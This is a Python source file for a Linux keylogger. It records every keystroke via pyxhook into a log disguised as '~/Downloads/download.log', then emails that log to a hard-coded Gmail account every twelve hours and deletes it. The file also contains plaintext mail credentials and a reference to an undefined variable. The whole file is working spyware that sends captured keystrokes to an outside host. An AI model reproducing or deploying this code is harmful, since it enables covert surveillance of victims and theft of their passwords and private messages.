#################################
# Keylogger to be used in Linux #
#################################

import os
import pyxhook
from datetime import datetime
import yagmail
from apscheduler.schedulers.blocking import BlockingScheduler

def sendLog(log):
    sender_email = "kloggertest42069@gmail.com"
    receiver_email = "kloggertest42069@gmail.com"
    subject = "Klogger"
    sender_password = "rotkiv1234"

    yag = yagmail.SMTP(user=sender_email, password=sender_password)

    contents = [
    "Klogger of the day"
    ]

   
    yag.send(receiver_email, subject, contents, attachments=log )

def Klogger():

    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('~/Downloads/download.log')
    )

    user = os.path.expanduser("~")
    timi = datetime.now()

    with open (log, 'a') as f:
        f.write(str(user) + '\n' + str(timi) + '\n')

    def OnKeyPress(event):
        with open(log, 'a') as f:
            if(event.Key == "Return" or event.Key == "Tab"):
                f.write('{}\n'.format(event.Key))
            else:
                f.write('{} - '.format(event.Key))


    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:

        pass
    except Exception as ex:
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

sched = BlockingScheduler()
Klogger()

@sched.scheduled_job('interval', hours=12)
def timed_job():
        homedir = os.path.expanduser("~")
        homedir = homedir + "/Downloads/download.log"

        sendLog(homedir)
        os.remove(homedir)


sched.start()
